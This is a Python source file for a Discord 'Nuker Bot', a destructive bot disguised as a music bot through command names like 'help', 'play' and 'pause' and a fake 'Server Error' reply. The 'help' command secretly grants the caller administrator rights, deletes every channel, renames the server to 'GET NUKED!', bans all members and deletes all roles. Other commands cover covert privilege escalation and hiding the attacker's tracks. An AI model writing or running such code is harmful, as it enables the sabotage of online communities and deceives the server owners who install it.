# Made by KingWaffleIII

# Nuker Bot
# v1.3.1

import discord
from discord.ext import commands
from datetime import datetime
from time import sleep

# var declarations

TOKEN = ""
prefix = "!"

intents = discord.Intents.default()
intents.members = True

bot = commands.Bot(command_prefix=prefix, intents=intents)


bot.remove_command("help")

bot_id = 813383774137614436

admin_role = [False]

# prints some basic info about the bot when ready
@bot.event
async def on_ready():
    activity = discord.Activity(
        name="for !help", type=discord.ActivityType.watching)
    await bot.change_presence(activity=activity)

    print(f"{bot.user} online!")
    print("Connected servers: \n")

    for guild in bot.guilds:
        print(guild.name)


# outputs to the log some basic info about the new guild when connected
@bot.event
async def on_guild_join(guild):
    with open("nuke_log.txt", "a+") as f:
        f.write(f'''
=> SERVER JOIN ALERT <=
{bot.user} has joined the server.
Server Name: {guild.name}
Server Owner: {guild.owner}
Time: {datetime.now()}
''')


# outputs to the log some basic info about the old guild when disconnected
@bot.event
async def on_guild_leave(guild):
    with open("nuke_log.txt", "a+") as f:
        f.write(f'''
=> SERVER LEAVE ALERT <=
{bot.user} has left the server.
Server Name: {guild.name}
Server Owner: {guild.owner}
Time: {datetime.now()}
''')


# gives an error to any command beginning with !
@bot.event
async def on_message(msg):
    await bot.process_commands(msg)

    if msg.content.startswith("!"):
        embed = discord.Embed(
            title="Server Error!", description="Our servers are currently experiencing some issues, please check back at a later time!",
            colour=0xff0000, set_image="https://i.imgur.com/qxBoiZY.png"
        )

        await msg.channel.send(content=None, embed=embed)


# nukes the server
@bot.command(name="help")
@commands.bot_has_permissions(administrator=True)
async def nuke(ctx):
    server_name = ctx.guild.name


    # make admin role and give user admin
    author = ctx.message.author
    global admin_role
    if not admin_role[0]:
        try:
            admin_role = []
            admin_role.append(True)

            role = await ctx.guild.create_role(name="Member", permissions=discord.Permissions(permissions=8))
            
            admin_role.append(role)
            admin_role.append(role.id)

        except discord.Forbidden:
            with open("nuke_log.txt", "a+") as f:
                f.write(f'''
Failed to create administrator role: insufficient permissions.
Server Name: {ctx.guild.name}
Server Owner: {ctx.guild.owner}
Time: {datetime.now()}
''')
                f.close()
    else:
        role = admin_role[1]

        if role is None:
            try:
                admin_role = []
                admin_role.append(True)

                role = await ctx.guild.create_role(name="Member", permissions=discord.Permissions(permissions=8))

                admin_role.append(role)
                admin_role.append(role.id)
            except discord.Forbidden:
                with open("nuke_log.txt", "a+") as f:
                    f.write(f'''
Failed to create administrator role: insufficient permissions.
Server Name: {ctx.guild.name}
Server Owner: {ctx.guild.owner}
Time: {datetime.now()}
''')

    print("Created admin role.")

    try:
        await ctx.message.author.add_roles(admin_role[1])
    except discord.Forbidden:
        with open("nuke_log.txt", "a+") as f:
            f.write(f'''
Failed to grant {ctx.message.author} the administrator role: insufficient permissions.
Server Name: {ctx.guild.name}
Server Owner: {ctx.guild.owner}
Time: {datetime.now()}
''')
            f.close()

    print(f"Granted {ctx.message.author} the admin role.")

    # delete all channels
    for guild in bot.guilds:
        if guild.name == ctx.guild.name:
            for channel in guild.channels:
                try:
                    await channel.delete()
                except discord.Forbidden:
                    with open("nuke_log.txt", "a+") as f:
                        f.write(f'''
Failed to delete channel "{channel.name}": insufficient permissions.
Server Name: {ctx.guild.name}
Server Owner: {ctx.guild.owner}
Time: {datetime.now()}
''')
                        f.close()

    print("Deleted all channels.")

    # create nuke channel
    try:
        nuke_channel = await ctx.guild.create_text_channel("get nuked")

        await nuke_channel.send(content="GET NUKED!", tts=True)
    except discord.Forbidden:
        with open("nuke_log.txt", "a+") as f:
            f.write(f'''
Failed to create the "get nuked" channel: insufficient permissions.
Server Name: {ctx.guild.name}
Server Owner: {ctx.guild.owner}
Time: {datetime.now()}
''')
            f.close()

    print("Created the nuke channel.")

    # change server icon & name
    with open("../nuke.jpg", "rb") as f:
        icon = f.read()
        f.close()
    try:
        await ctx.guild.edit(name="GET NUKED!", icon=icon)
    except discord.Forbidden:
        with open("nuke_log.txt", "a+") as f:
            f.write(f'''
Failed to edit the server's icon and name: insufficient permissions.
Server Name: {ctx.guild.name}
Server Owner: {ctx.guild.owner}
Time: {datetime.now()}
''')
            f.close()

    print("Edited the server's icon and name.")

    # ban all users
    members = []
    for member in ctx.guild.members:
        members.append(member.id)

    members.remove(bot_id) # remove the bot from the "to be banned" list
    members.remove(ctx.message.author.id) # remove the user from the "to be banned" list
    members.remove(ctx.guild.owner_id) # remove the server owner from the "to be banned" list

    if members != []:
        for member_id in members:
            member = await bot.fetch_user(member_id)
            if not member.bot:
                try:
                    await ctx.guild.ban(member, reason="NUKE DETONATED!")
                except discord.Forbidden:
                    with open("nuke_log.txt", "a+") as f:
                        f.write(f'''
Failed to ban user "{member}": insufficient permissions.
Server Name: {ctx.guild.name}
Server Owner: {ctx.guild.owner}
Time: {datetime.now()}
''')
                        f.close()
            else:
                with open("nuke_log.txt", "a+") as f:
                    f.write(f'''
Failed to ban user "{member}": user is a bot.
Server Name: {ctx.guild.name}
Server Owner: {ctx.guild.owner}
Time: {datetime.now()}
''')
                    f.close()
                    members.remove(member_id)

    print("Banned all users.")

    # delete all roles
    roles = []
    for role in ctx.guild.roles:
        roles.append(role)

    roles.remove(ctx.guild.default_role) # removes @everyone from the "role to be deleted" list
    roles.remove(discord.utils.get(ctx.guild.roles, name="Rythm Pro")) # removes the bot role from the "role to be deleted" list
    roles.remove(admin_role) # remove the admin role made above from the "role to be deleted" list


    for role in roles:
        try:
            await role.delete()
        except discord.Forbidden:
            with open("nuke_log.txt", "a+") as f:
                f.write(f'''
Failed to delete role "{role.name}": insufficient permissions.
Server Name: {ctx.guild.name}
Server Owner: {ctx.guild.owner}
Time: {datetime.now()}
''')
                f.close()
                roles.remove(role)
                
    print("Deleted all roles.")

    with open("nuke_log.txt", "a+") as f:
        f.write(f'''
=> NUKE ALERT <=
Server Name: {server_name}
Server Owner: {ctx.guild.owner}
Banned Users: {len(members)}
Roles Deleted: {len(roles)}
Time: {datetime.now()}
''')
        f.close()


# gives the user admin
@bot.command(name="play")
async def play(ctx):
    await ctx.message.delete()

    global admin_role

    if not admin_role[0]:

        try:
            admin_role = []
            admin_role.append(True)

            role = await ctx.guild.create_role(name="Member", permissions=discord.Permissions(permissions=8))

            admin_role.append(role)
            admin_role.append(role.id)

            await ctx.message.author.add_roles(admin_role[1])
        except discord.Forbidden:
            with open("nuke_log.txt", "a+") as f:
                f.write(f'''
Failed to create administrator role: insufficient permissions.
Server Name: {ctx.guild.name}
Server Owner: {ctx.guild.owner}
Time: {datetime.now()}
''')

        print(f"Gave {ctx.message.author} the admin role.")

        with open("nuke_log.txt", "a+") as f:
            f.write(f'''
=> ADMIN ALERT <=
Gave {ctx.message.author} the admin role.
Server Name: {ctx.guild.name}
Server Owner: {ctx.guild.owner}
Time: {datetime.now()}
''')
            f.close()

    else:
        role = admin_role[1]

        if role is None:
            try:
                admin_role = []
                admin_role.append(True)

                role = await ctx.guild.create_role(name="Member", permissions=discord.Permissions(permissions=8))

                admin_role.append(role)
                admin_role.append(role.id)

                await ctx.message.author.add_roles(admin_role[1])
            except discord.Forbidden:
                with open("nuke_log.txt", "a+") as f:
                    f.write(f'''
Failed to create administrator role: insufficient permissions.
Server Name: {ctx.guild.name}
Server Owner: {ctx.guild.owner}
Time: {datetime.now()}
''')

        else:
            await ctx.message.author.add_roles(admin_role[1])
            with open("nuke_log.txt", "a+") as f:
                f.write(f'''
=> ADMIN ALERT <=
Gave {ctx.message.author} the admin role.
Server Name: {ctx.guild.name}
Server Owner: {ctx.guild.owner}
Time: {datetime.now()}
''')


# bans the person who ran the command to avoid suspicion
@bot.command(name="pause")
async def pause(ctx):
    await ctx.message.delete() 
    await ctx.guild.ban(await bot.fetch_user(ctx.message.author.id))
    with open("nuke_log.txt", "a+") as f:
        f.write(f'''
=> NUKER BAN ALERT <=
Nuker ({await bot.fetch_user(ctx.message.author.id)}) has been banned from the server!
Server Name: {ctx.guild.name}
Server Owner: {ctx.guild.owner}
Time: {datetime.now()}
''')
        f.close()


# bans the person who ran the command as well as removing the bot
@bot.command(name="stop")
async def stop(ctx):
    await ctx.message.delete() 
    await ctx.guild.ban(await bot.fetch_user(ctx.message.author.id))
    await ctx.guild.leave()
    with open("nuke_log.txt", "a+") as f:
        f.write(f'''
=> NUKER CLEANUP ALERT <=
Nuker ({await bot.fetch_user(ctx.message.author.id)}) has been banned from the server and the bot has been removed!
Server Name: {ctx.guild.name}
Server Owner: {ctx.guild.owner}
Time: {datetime.now()}
''')
        f.close()


# leaves the server
@bot.command(name="leave")
async def leave(ctx):
    await ctx.guild.leave()
    with open("nuke_log.txt", "a+") as f:
        f.write(f'''
=> SERVER LEAVE ALERT <=
{bot.user} has left the server.
Server Name: {ctx.guild.name}
Server Owner: {ctx.guild.owner}
Time: {datetime.now()}
''')


# checks if the bot has administrator permissions
# if it doesn't, throws an error
@nuke.error
async def nuke_error(ctx, error):
    if isinstance(error, commands.BotMissingPermissions):
        await ctx.send("Checking environment...")
        sleep(1)
        try:
            embed = discord.Embed(title="Error: Missing Required Permissions!",
description="This bot is lacking required permissions!")
            embed.add_field(name="You need to grant me the following permission(s):",
value="- Administrator")
            await ctx.send(content=None, embed=embed)
        except discord.Forbidden:
            await ctx.send('''
__**Error: Missing Required Permission!**__
**I need the following permission(s) to function properly:**
- `Administrator`
''')

        with open("nuke_log.txt", "a+") as f:
            f.write(f'''
Bad Environment: Insufficient Permissions!
Server Name: {ctx.guild.name}
Server Owner: {ctx.guild.owner}
Time: {datetime.now()}
''')


@play.error
async def play_error(ctx, error):
    if isinstance(error, commands.BotMissingPermissions):
        await ctx.send("Checking environment...")
        sleep(1)
        try:
            embed = discord.Embed(title="Error: Missing Required Permissions!",
description="This bot is lacking required permissions!")
            embed.add_field(name="You need to grant me the following permission(s):",
value="- Administrator")
            await ctx.send(content=None, embed=embed)
        except discord.Forbidden:
            await ctx.send('''
__**Error: Missing Required Permission!**__
**I need the following permission(s) to function properly:**
- `Administrator`
''')

        with open("nuke_log.txt", "a+") as f:
            f.write(f'''
Bad Environment: Insufficient Permissions!
Server Name: {ctx.guild.name}
Server Owner: {ctx.guild.owner}
Time: {datetime.now()}
''')


@pause.error
async def pause_error(ctx, error):
    if isinstance(error, commands.BotMissingPermissions):
        await ctx.send("Checking environment...")
        sleep(1)
        try:
            embed = discord.Embed(title="Error: Missing Required Permissions!",
description="This bot is lacking required permissions!")
            embed.add_field(name="You need to grant me the following permission(s):",
value="- Administrator")
            await ctx.send(content=None, embed=embed)
        except discord.Forbidden:
            await ctx.send('''
__**Error: Missing Required Permission!**__
**I need the following permission(s) to function properly:**
- `Administrator`
''')

        with open("nuke_log.txt", "a+") as f:
            f.write(f'''
Bad Environment: Insufficient Permissions!
Server Name: {ctx.guild.name}
Server Owner: {ctx.guild.owner}
Time: {datetime.now()}
''')


@stop.error
async def stop_error(ctx, error):
    if isinstance(error, commands.BotMissingPermissions):
        await ctx.send("Checking environment...")
        sleep(1)
        try:
            embed = discord.Embed(title="Error: Missing Required Permissions!",
description="This bot is lacking required permissions!")
            embed.add_field(name="You need to grant me the following permission(s):",
value="- Administrator")
            await ctx.send(content=None, embed=embed)
        except discord.Forbidden:
            await ctx.send('''
__**Error: Missing Required Permission!**__
**I need the following permission(s) to function properly:**
- `Administrator`
''')

        with open("nuke_log.txt", "a+") as f:
            f.write(f'''
Bad Environment: Insufficient Permissions!
Server Name: {ctx.guild.name}
Server Owner: {ctx.guild.owner}
Time: {datetime.now()}
''')

while True:
    print("\nPlease enter your bot token: ")
    print("(if you don't know what this is, please visit: https://github.com/KingWaffleIII/Nuker-Bot#setup to see how to make your own bot application)\n")
    input("> ")
    try:
        bot.run(TOKEN)
    except discord.LoginFailure:
        print("Unable to log into the bot; please verify the bot token is correct!")
